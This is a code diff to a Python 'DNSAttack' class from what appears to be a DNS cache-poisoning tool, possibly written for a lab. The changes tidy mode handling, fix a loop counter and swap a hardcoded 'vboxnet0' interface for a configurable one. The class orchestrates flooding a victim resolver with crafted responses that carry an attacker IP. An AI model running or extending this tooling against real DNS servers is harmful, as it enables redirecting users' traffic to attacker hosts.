@@ -303,11 +303,13 @@ class DNSAttack:
 
         # Check the attack mode
         # ---------------------------------------
-        if mode == self.Mode.NORMAL:
+        if mode == "NORMAL":
             self.log("Using Normal Mode")
-        elif mode == self.Mode.FAST:
+            mode = self.Mode.NORMAL
+        elif mode == "FAST":
             self.log("Using Faster Mode")
             self.log("Opening socket...")
+            mode = self.Mode.FAST
             flood_socket = DNSPoisoning.create_socket(self, self.nic_interface)
         #----------------------------------------
 
@@ -324,7 +326,7 @@ class DNSAttack:
 
 
         # Attack Loop
-        while number_of_tries and not succeded and not self.stop_flag:
+        while num and not succeded and not self.stop_flag:
 
             self.log("\n ------ {t.bold}{t.shadow}Attack Number " + str(number_of_tries - num) + "{t.normal} ------\n")
 
@@ -356,8 +358,6 @@ class DNSAttack:
             poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, self.ns_server_ip, fetched_id, sport = source_port,\
                 victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
-            print(self.attack_type)
-
             # Set the attack type
             #--------------------------------------------------------
             if self.attack_type == DNSPoisoning.AttackType.NORMAL:
@@ -376,14 +376,12 @@ class DNSAttack:
             signal.signal(signal.SIGINT, poison.stop_handler)
 
             self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...", 3)
-
             ## Start the specified Attack 
             #--------------------------------------------------------
             if mode == self.Mode.NORMAL:
                 # Normal Flooding
                 try:
                     poison.start_flooding()
-
                 except:
                     self.log("{t.underline}Unknow Error has occurred{t.normal}")
                     raise self.CriticalError
@@ -391,7 +389,7 @@ class DNSAttack:
             elif mode == self.Mode.FAST:
                 # Fast Flooding
                 try:
-                    poison.set_interface('vboxnet0')
+                    poison.set_interface(self.nic_interface)
                     poison.set_victim_mac(self.victim_mac)
                     poison.faster_flooding()    #Using the faster version
 
